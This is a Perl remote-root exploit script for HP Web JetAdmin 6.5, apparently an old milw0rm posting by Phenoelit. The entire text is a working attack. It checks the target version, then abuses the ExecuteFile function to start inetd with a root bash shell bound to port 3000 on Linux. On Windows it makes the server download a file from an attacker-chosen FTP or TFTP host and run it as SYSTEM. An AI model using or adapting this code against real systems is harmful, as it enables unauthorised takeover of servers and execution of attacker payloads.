<html><head><title>HP Web JetAdmin 6.5 (connectedNodes.ovpl) Remote Root Exploit</title></head><pre>#!/usr/bin/perl 
use IO::Socket;
#
# This is an exploit for HP Web JetAdmin, the printer management server from HP. 
# It is NOT about printers! The service usually runs on port 8000 on Windows, 
# Solaris or Linux boxes.
#
# Greetz: The Phenoelit People, c-base crew, EEyE (rock!), Halvar on the other
#         side of the planet, Johnny, Andreas, Lisa, H D Moore, Nicolas
#         Fishbach and all the others I forgot
#


$|=1;

die &quot;Specify server name or IP\n&quot; unless ($host=shift);

#
# lala stuff 
# 
print &quot;Phenoelit HP Web JetAdmin 6.5 remote\n&quot;.
&quot; Linux root and Windows NT/2000 Administrator exploit\n&quot;.
&quot; by FX of Phenoelit\n&quot;.
&quot; Research done at BlackHat Singapore 2002\n\n&quot;;

#
# Check version for the kiddies
# 
$request=&quot;GET /plugins/hpjwja/help/about.hts HTTP/1.0\r\n\r\n&quot;;
&amp;doit();
#
# Get the path first
#
$rs=~/--\ framework\.ini\ (.+)--&gt;/;
$hppath=$1;
if ($hppath) { $hppath=~s/\/doc\/plugins\/framework\/framework.ini//; }
# 
# Now get some more info
#
$rs=~s/[\r\n\t]//g;
$rs=~s/&lt;\/td&gt;&lt;td\ valign\=\&quot;top\&quot;\ nowrap&gt;//g;
$rs=~/JetAdmin\ Version&lt;\/b&gt;([^&lt;]+)&lt;\/td&gt;/;
$version=$1;
$rs=~/System\ Version&lt;\/b&gt;([^&lt;]+)&lt;\/td&gt;/;
$system=$1;
die &quot;It's not version 6.5 or version extraction failed\n&quot; unless ($version=~/6\.5/);
die &quot;Could not extract path\n&quot; unless ($hppath);
#
# Info 2 user
#
print &quot;HP Web JetAdmin Path: \n\t&quot;.$hppath.&quot;\n&quot;;
print &quot;HP Web JetAdmin Version: &quot;.$version.&quot;\n&quot;;

if ($system=~/Linux/) {
printf &quot;Host system identified as Linux ...\n&quot;;
#
# Create file content and kick off inetd
#
$cont= 
&quot;obj=Httpd:VarCacheSet(hacked,true);&quot;.
    &quot;Httpd:ExecuteFile(/usr/sbin/,inetd,&quot;.$hppath.&quot;/cache.ini)&quot;.
&quot;&amp;__BrowserID=0%0a3000%20stream%20tcp%20nowait%20root%20/bin/bash%20bash%0a&quot;;

$request = &quot;POST /plugins/framework/script/content.hts HTTP/1.0\r\n&quot;.
&quot;Host: &quot;.$host.&quot;\r\n&quot;.
&quot;Accept: text/html, text/plain, application/pdf, image/*, &quot;.
&quot;image/jpeg, text/sgml, video/mpeg, image/jpeg, &quot;.
&quot;image/tiff, image/x-rgb, image/png, image/x-xbitmap,&quot;.
&quot; image/x-xbm, image/gif, application/postscript, */*;q=0.01\r\n&quot;.
&quot;Accept-Language: en\r\n&quot;.
&quot;Pragma: no-cache\r\n&quot;.
&quot;Cache-Control: no-cache\r\n&quot;.
&quot;User-Agent: Phenoelit script\r\n&quot;.
&quot;Referer: http://www.phenoelit.de/\r\n&quot;.
&quot;Content-type: application/x-www-form-urlencoded\r\n&quot;.
&quot;Content-length: &quot;.length($cont).&quot;\r\n\r\n&quot;.
$cont;

&amp;doit();
print &quot;You should now connect to $host:3000 and enjoy your root shell\n&quot;;

} elsif ($system=~/WinNT/) {

print &quot;Target system is Windows.\n&quot;.
&quot; Do you want file upload via FTP [f] or TFTP [t]: &quot;;
$usersel=&lt;STDIN&gt;;
if ($usersel=~/^f/i) {
print &quot;FTP used ...\n&quot;;
print &quot;FTP Host: &quot;; $ftph=&lt;STDIN&gt;; chomp($ftph);
print &quot;FTP User: &quot;; $ftpu=&lt;STDIN&gt;; chomp($ftpu);
print &quot;FTP Pass: &quot;; $ftpp=&lt;STDIN&gt;; chomp($ftpp);
print &quot;FTP Path: &quot;; $ftppath=&lt;STDIN&gt;; chomp($ftppath);
print &quot;FTP File: &quot;; $ftpfile=&lt;STDIN&gt;; chomp($ftpfile);

print &quot;File &quot;.$ftpfile.&quot; will be downloaded from &quot;.$ftph.$ftppath.&quot;\n&quot;.
&quot; with username &quot;.$ftpu.&quot; and password &quot;.$ftpp.&quot;\n&quot;;

$cont=
&quot;obj=&quot;.
&quot;Httpd:ExecuteFile(,cmd.exe,/c,echo,open &quot;.$ftph.&quot;,&gt;c:\\x.txt);&quot;.
&quot;Httpd:ExecuteFile(,cmd.exe,/c,echo,&quot;.$ftpu.&quot;&gt;&gt;c:\\x.txt);&quot;.
&quot;Httpd:ExecuteFile(,cmd.exe,/c,echo,&quot;.$ftpp.&quot;&gt;&gt;c:\\x.txt);&quot;.
&quot;Httpd:ExecuteFile(,cmd.exe,/c,echo,lcd c:\\,&gt;&gt;c:\\x.txt);&quot;.
&quot;Httpd:ExecuteFile(,cmd.exe,/c,echo,cd &quot;.$ftppath.&quot;,&gt;&gt;c:\\x.txt);&quot;.
&quot;Httpd:ExecuteFile(,cmd.exe,/c,echo,bin,&gt;&gt;c:\\x.txt);&quot;.
&quot;Httpd:ExecuteFile(,cmd.exe,/c,echo,get &quot;.$ftpfile.&quot;,&gt;&gt;c:\\x.txt);&quot;.
&quot;Httpd:ExecuteFile(,cmd.exe,/c,echo,quit,&gt;&gt;c:\\x.txt);&quot;.
&quot;Httpd:ExecuteFile(,ftp.exe,-s:c:\\x.txt);&quot;.
&quot;Httpd:ExecuteFile(c:\\,&quot;.$ftpfile.&quot;)&quot;;

} elsif ($usersel=~/^t/) {
print &quot;TFTP used ...\n&quot;;
print &quot;TFTP Host: &quot;; $ftph=&lt;STDIN&gt;; chomp($ftph);
print &quot;TFTP Path: &quot;; $ftppath=&lt;STDIN&gt;; chomp($ftppath);
print &quot;TFTP File: &quot;; $ftpfile=&lt;STDIN&gt;; chomp($ftpfile);

$ftppath.=&quot;/&quot; unless ($ftppath=~/\/$/);
$cont=
&quot;obj=&quot;.
&quot;Httpd:ExecuteFile(,tftp.exe,-i,&quot;.$ftph.&quot;,GET,&quot;.
$ftppath.$ftpfile.&quot;,c:\\&quot;.$ftpfile.&quot;);&quot;.
&quot;Httpd:ExecuteFile(c:\\,&quot;.$ftpfile.&quot;)&quot;;

} else {
print &quot;Wurstfinger ?\n&quot;;
exit 0;
}

$request = &quot;POST /plugins/framework/script/content.hts HTTP/1.0\r\n&quot;.
&quot;Host: &quot;.$host.&quot;\r\n&quot;.
&quot;Accept: text/html, text/plain, application/pdf, image/*, &quot;.
&quot;image/jpeg, text/sgml, video/mpeg, image/jpeg, &quot;.
&quot;image/tiff, image/x-rgb, image/png, image/x-xbitmap,&quot;.
&quot; image/x-xbm, image/gif, application/postscript, */*;q=0.01\r\n&quot;.
&quot;Accept-Language: en\r\n&quot;.
&quot;Pragma: no-cache\r\n&quot;.
&quot;Cache-Control: no-cache\r\n&quot;.
&quot;User-Agent: Phenoelit script\r\n&quot;.
&quot;Referer: http://www.phenoelit.de/\r\n&quot;.
&quot;Content-type: application/x-www-form-urlencoded\r\n&quot;.
&quot;Content-length: &quot;.length($cont).&quot;\r\n\r\n&quot;.
$cont;

print &quot;If everything works well, the specified file should be running\n&quot;.
&quot; soon in SYSTEM context. Don't stop this script until your program\n&quot;.
&quot; terminates. Enjoy the box.\n&quot;;
&amp;doit();

} else {
print &quot;Host OS (&quot;.$system.&quot;) not supported by exploit - modify it\n&quot;;
}

exit 0;


sub doit {
    $remote =
      IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;$host,PeerPort=&gt;&quot;8000&quot;,);
    die &quot;cannot connect to http daemon on $host\n&quot; unless($remote);
    $remote-&gt;autoflush(1);
    print $remote $request;

    $rs=&quot;&quot;;
    while ( $rline=&lt;$remote&gt; ) { 
$rs.=$rline;
#print $rline;
    }

    close $remote;
}

# milw0rm.com [2004-04-28]</pre></html>